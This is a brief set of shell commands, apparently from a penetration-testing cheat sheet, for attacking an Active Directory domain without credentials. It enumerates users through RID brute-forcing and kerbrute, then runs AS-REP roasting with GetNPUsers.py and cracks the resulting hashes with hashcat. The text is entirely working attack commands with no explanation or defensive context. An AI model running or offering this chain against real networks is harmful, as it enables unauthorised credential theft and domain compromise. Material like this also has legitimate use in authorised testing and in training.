```
# Enumerate users first via RID brute (no creds):
lookupsid.py corp.local/guest@192.168.x.100 -no-pass 2>/dev/null | grep "SidTypeUser"
# Or kerbrute:
kerbrute userenum -d corp.local --dc 192.168.x.100 \
    /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Then AS-REP roast without creds:
GetNPUsers.py corp.local/ -no-pass -usersfile domain_users.txt \
    -dc-ip 192.168.x.100 -format hashcat
hashcat -m 18200 asrep.txt rockyou.txt
```